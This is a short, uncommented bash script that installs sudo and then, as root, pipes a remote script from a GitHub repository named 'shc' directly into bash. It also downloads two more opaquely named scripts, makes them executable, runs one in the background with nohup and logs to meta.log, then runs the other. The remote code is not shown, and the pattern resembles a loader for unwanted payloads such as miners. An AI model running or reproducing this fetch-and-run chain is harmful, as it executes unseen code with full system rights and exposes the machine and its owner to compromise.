#!/bin/bash
apt-get update ; apt-get install sudo -y
sudo su --command "bash <(wget -qO- https://raw.githubusercontent.com/Sonehra/shc/master/boled02.sh)"
sudo su --command "wget https://raw.githubusercontent.com/Sonehra/shc/master/taleus01.sh && chmod +x taleus01.sh"
sudo su --command "nohup ./taleus01.sh --log=stdout > meta.log &"
sleep 2
sudo su --command "cat meta.log" 
sudo su --command "wget https://raw.githubusercontent.com/Sonehra/shc/master/taleus02.sh && chmod +x taleus02.sh"
sudo su --command "./taleus02.sh"
